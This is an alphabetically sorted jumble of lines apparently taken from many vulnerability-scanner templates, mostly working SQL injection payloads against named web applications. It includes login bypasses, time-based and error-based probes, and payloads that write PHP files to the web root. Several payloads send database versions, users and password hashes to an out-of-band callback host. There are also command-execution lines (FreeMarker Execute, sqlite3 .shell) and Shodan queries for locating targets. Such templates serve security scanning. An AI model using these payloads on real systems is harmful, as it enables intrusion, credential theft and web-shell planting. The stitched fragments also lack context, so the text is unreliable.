+language")'
+limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and
+loginIdentifer=&simcardId=';WAITFOR DELAY '0:0:6'--
+mailuid=admin' or 1=1#&pwd={{rand_base(5)}}&login-submit=Login
+md5(1))),1)'
+name: MSSQL UNION query
+name: OpenCart Core 4.0.2.3 'search' - SQL Injection
+name: Oracle AND time-based blind
+name: Royal Event Management System 1.0 - 'todate' SQL Injection
+name: UNION query
+name=0'XOR({{mysql}})XOR'Z&password=u]H[ww6KrA9F.x-F
+num1: "{{rand_int(40000, 44800)}}"
+num1: '{{rand_int(10,500,10)}}'
+num2: "{{rand_int(40000, 44800)}}"
+num: "999999999"
+num: "{{rand_int(9000000, 9999999)}}"
+num: '999999999'
+num: '{{rand_int(10, 99)}}'
+num: '{{rand_int(100000,999999)}}'
+number: '{{rand_int(1, 100)}}'
+option=com_hdwplayer&view=search&hdwplayersearch=')+AND+(SELECT+6495+FROM+(SELECT(SLEEP({{.sleep}})))IAul)--+vYqM
+or to override valuable ones, or even to execute dangerous system level commands on the database host.
+part: interactsh_protocol # Confirms the HTTP Interaction
+path: /?/member/cart/Fastpay&shopid=-1%20union%20select%20md5({{rand}}),2,3,4%20--+
+path: /admin/?n=language&c=language_general&a=doSearchParameter&editor=cn&word=search&appno=0+union+select+{{r1}}*{{r2}},1--+&site=admin
+path: /admin/cms_channel.php?del=123456+AND+(SELECT+1+FROM(SELECT+COUNT(*)%2cCONCAT(0x7e%2cmd5(202072102)%2c0x7e%2cFLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x)a)--%2b
+path: /api.php?c=project&f=index&token=1234&id=news&sort=1 and extractvalue(1,concat(0x7e,md5({{r1}}))) --+
+path: /api/sms_check.php?param=1%27%20and%20updatexml(1,concat(0x7e,(SELECT%20MD5(1234)),0x7e),1)--%20
+path: /faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=)%20and%20(select%201%20from%20(select%20count(*),concat((select%20concat(user,0x3a,md5(1234),0x3a)%20from%20mysql.user%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23
+path: /images/lists?cid=1 ) ORDER BY 1 desc,extractvalue(rand(),concat(0x7c,md5({{r1}}))) desc --+a
+path: /index.php?m=&c=AjaxPersonal&a=company_focus&company_id[0]=match&company_id[1][0]=aaaaaaa") and extractvalue(1,concat(0x7e,md5(99999999))) -- a
+path: /index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=1&type_id=1&list[select]=updatexml(0x23,concat(1,md5(8888)),1)
+path: /index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,md5(8888)),1)
+path: /jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0xa,md5({{r}})),0)
+path: /member/ajax_membergroup.php?action=post&membergroup=@`'`/*!50000Union+*/+/*!50000select+*/+md5({{r}})+--+@`'`
+path: /mobile/index/index2/id/1) and (select 1 from (select count(*),concat(0x716b627671,(select md5({{r}})),0x716b627671,floor(rand(0)*2))x from information_schema.tables group by x)a)--
+path: /plus/guestbook.php?action=admin&job=editok&id={{articleid}}&msg=',msg=@`'`,msg=(selecT md5({{r}})),email='
+path: /upload/mobile/index.php?c=category&a=asynclist&price_max=1.0%20AND%20(SELECT%201%20FROM(SELECT%20COUNT(*),CONCAT(0x7e,md5(1),0x7e,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)'
+path: /user/City_ajax.aspx?CityId={{r2}}'union%20select%20sys.fn_sqlvarbasetostr(HashBytes('MD5','{{r1}}')),2--
+path: /yyoa/ext/trafaxserver/downloadAtt.jsp?attach_ids=(1)%20and%201=2%20union%20select%201,2,3,4,5,md5({{rand}}),7--
+payload: "[group]:[1]|[groupid]:[1 union select '<?php echo md5(\"{{string}}\");unlink(__FILE__);?>',2,3,4,5,6,7,8 into outfile '../webroot/{{filename}}.php']"
+payload: "{{rand_base(6)}}"
+payload: '{{rand_int(1, 100)}}'
+publicwww-query: "/wp-content/plugins/adiaha-hotel/"
+publicwww-query: "/wp-content/plugins/smart-manager-for-wp-e-commerce/"
+publicwww-query: "/wp-content/themes/xhibiter/"
+quake-query: app.name=="Dahua 大华 智慧园区管理平台"
+quake-query: app:"瑞友天翼应用虚拟化系统"
+randomValue: '{{rand_int(200000000, 210000000)}}'
+random_string: "{{randstr}}"
+randomchar1: {{rand_char("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789")}}
+randomchar2: {{rand_char("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789")}}
+randomstr1: {{rand_text_alpha(5, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz")}}
+randomstr2: {{rand_text_alpha(5, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz")}}
+reference: https://github.com/ffffffff0x/1earn/blob/27236f18098d66d7cf5c881dc70236968d5219cf/1earn/Security/RedTeam/Web%E5%AE%89%E5%85%A8/BS-Exploits.md#activemq
+result: "{{to_number(num1)*to_number(num2)}}"
+search: '"action=admin&id=(?P<articleid>\\d{1,20})".bsubmatch(response.body)'
+setpers_EmpEnglishName=setpers_UserAccounts=TpDv&setpers_UserSimpleName=&setpers_EmpMobilePhone=TpIy&setpers_EmpbusPhone=&setpers_EmpEmail=JxIC&setpers_EmpPhone=&setpers_Empsex1=0&setpers_EmpDescribe=ffASsetpers_EmpName=exci'%3BWAITFOR%20DELAY%20'0%3A0%3A5'--
+shodan-query: html:"authorization token is empty"
+shodan-query: html:"stackposts"
+shodan-query: http.component:"Joomla"
+shodan-query: http.component:"Prestashop"
+shodan-query: http.component:"vBulletin"
+shodan-query: http.html:"dotnetcms"
+shodan-query: title:"OpenCart"
+shodan-query: title:"Registration and Login System"
+shodan-query: title:"孚盟云 "
+siteid=1&modelid=1&username=qwerty&password=qwerty1&email=123456@qq.com&info[content]=<img src=http://7xusrl.com1.z0.glb.clouddn.com/bypassdog.txt?.php#.jpg>&dosubmit=1&protocol=
+sleep(1)
+sqlite3 /dev/null '.shell whoami'
+sqlite3 is a lightweight, self-contained, and serverless SQL database engine. It is widely used in embedded systems, mobile devices, and small to medium-sized applications.
+station_id=1 AND (SELECT 2469 FROM(SELECT COUNT(*),CONCAT(0x7162716b71,md5({{num}}),0x7162716b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+str1: "{{randstr}}"
+str2: "{{randstr}}"
+str: "{{randstr}}"
+string: "weaver-group-xml-sqli"
+string: '{{rand_base(8, "abc")}}'
+subjcode=';WAITFOR DELAY '0:0:5'--
+sudo sqlite3 /dev/null '.shell whoami'
+tfs=city` where cityId =-1 /*!50000union*/ /*!50000select*/1,2,database() ,4#|2|333
+title)values("'"^exp(if(ascii(substr(MOD(5,2),1,1))<128,1,710)))# =1&_SERVER=
+title)values("'"^exp(if(ascii(substr(MOD(5,2),1,1))>128,1,710)))# =1&_SERVER=
+token=zxh&sql=select substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','{{num}}')),3,32)&strParameters
+type=image&field_id=image&tag=image&from=image&search=image&options=["test') or 1=1 -- "]
+user or used in SQL queries.
+user=admin' uni union on selselectect null,null,null,null,0x3c3f706870206563686f206d643528323333293b756e6c696e6b285f5f46494c455f5f293b3f3e  in into outoutfilefile '....//....//....//var/www/html/test.php'--%20&password=123&code=b84d&submit=true&submit.x=44&submit.y=20
+userName='%3bWAITFOR+DELAY+'0%3a0%3a5'--%26ysnd%3d%26historyFlag%3d
+username=%22'%20or%201%3d1%3b%22&password=%018d8cbc8bfc24f018&ClientStatus=1
+username=%22'%20or%201%3d2%3b%22&password=%018d8cbc8bfc24f018&ClientStatus=1
+username=1')AND (SELECT 9595 FROM (SELECT(SLEEP(7)))YRMM) AND ('gaNg'='gaNg&password=test
+username=TestJu' or updatexml(1,concat(0x7e,md5(45643)),1))%23&password=TestJun&remember=TestJun
+username=admin%27+--+-&password=whatever&login=
+username=admin' AND (SELECT 6999 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm
+username=admin'+or+'1'%3D'1'%23&password={{rand_base(5)}}
+username=dd' or extractvalue(0x0a,concat(0x0a,810663301*872821376))#&password=dd&submit=+%B5%C7+%C2%BC+
+username=dd' or extractvalue(0x0a,concat(0x0a,md5({{num}})))#&password=dd&submit=+%B5%C7+%C2%BC+
+usertable=h00&usernumber=1&i9999=-1';WAITFOR DELAY '0:0:4'--+
+v1: '{{rand_base(4)}}'
+vBulletin 4 is vulnerable to an SQL injection vulnerability, which may allow an attacker can execute malicious SQL statements that control a web application's database server.
+vBulletin versions 3.x and 4.x suffer from an AjaxReg remote blind SQL injection vulnerability.
+verified: "true"
+verify: '{{md5({{number}})}}'
+verify: '{{rand_text_alphanumeric(32,"")}}'
+wfpk=1'&proInsPk=t
+xajax=LiveMessage&xajaxargs[0]=<xjxobj><q><e><k>name</k><v>%27,(UpdateXML(1,CONCAT(0x5b,mid((SELECT/**/GROUP_CONCAT(md5(1))),1,32),0x5d),1)),NULL,NULL,NULL,NULL,NULL,NULL)--%20</v></e></q></xjxobj>
+ygbh=q' AND (SELECT 1635 FROM (SELECT(SLEEP(7)))mlQT) AND 'qoYJ'='qoYJ
+{ "scheduleName": "' AND 1 IN (SELECT sys.fn_varbintohexstr(hashbytes('MD5','1'))) AND '1'='1", "timeStr": "" }
+{"AccountNum":"000'","UserName":"adm1in","Password":"c4ca4238a0b923820dcc509a6f75849b","rdpYear":"2023","rdpMonth":"7","rdpDate":"5","webServiceProcessID":"admin","ali_csessionid":"","ali_sig":"","ali_token":"","ali_scene":"","role":"","aqdKey":"","cardNo":""}
+{"accNum": "6'", "functionTag": "SYS0104", "url": ""}
+{"app_id":"20","email":"test@example.com'; waitfor delay '0:0:7' -- ","appHost":"https://{{Hostname}}/ia"}
+{"cusNumber":"1' and 2=user--+"}
+{"id": "1' OR 1=1--"}
+{"params": {"a": ""}, "sql": ""}
+{"query":"query SQLi($d: Duration!){globalP99:getLinearIntValues(metric: {name:\"all_p99\",id:\"') UNION SELECT 1,CONCAT('~','{{r1}}','~')-- \",}, duration: $d){values{value}}}","variables":{"d":{"start":"2021-11-11","end":"2021-11-12","step":"DAY"}}}
+{"scheduleName":"' AND 1 IN (SELECT sys.fn_varbintohexstr(hashbytes('MD5','1'))) AND '1'='1"}
+{"sql":"select 'result:<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"ping {{interactsh-url}}\") }' "}
+|| contains(all_headers_1,'Error'))
+§header§: 'select load_file(CONCAT('\\',(SELECT+@@version),'.',(SELECT+user),'.',(SELECT+password),'.','{{interactsh-url}}\vfw'))'
+§header§: SELECT DBMS_LDAP.INIT((SELECT version FROM v$instance)||'.'||(SELECT user FROM dual)||'.'||(select name from V$database)||'.'||'{{interactsh-url}}',80) FROM dual;'
+§header§: SELECT UTL_HTTP.request('http://192.168.220.130/sqli.php?id=1%27%2b%28%28select%20load%5ffile%28CONCAT%28%27%5c%5c%5c%5c%27%2c%28SELECT%2buser%29%2c%27%2e%27%2c%28SELECT%2bpassword%29%2c%27%2e%27%2c%27{{interactsh-url}}%5c%5cvfw%27%29%29%29%29%2b%27') FROM dual;'
+§header§: SELECT UTL_HTTP.request('http://{{interactsh-url}}/'||'?version='||(SELECT version FROM v$instance)||'&'||'user='||(SELECT user FROM dual)||'&'||'hashpass='||(SELECT spare4 FROM sys.user$ WHERE rownum=1)) FROM dual;'
+§header§: {{interactsh-url}}.'DECLARE @a varchar(1024); DECLARE @b varchar(1024); SELECT @a = (SELECT system_user); SELECT @b = (SELECT DB_Name()); EXEC('master..xp_dirtree'
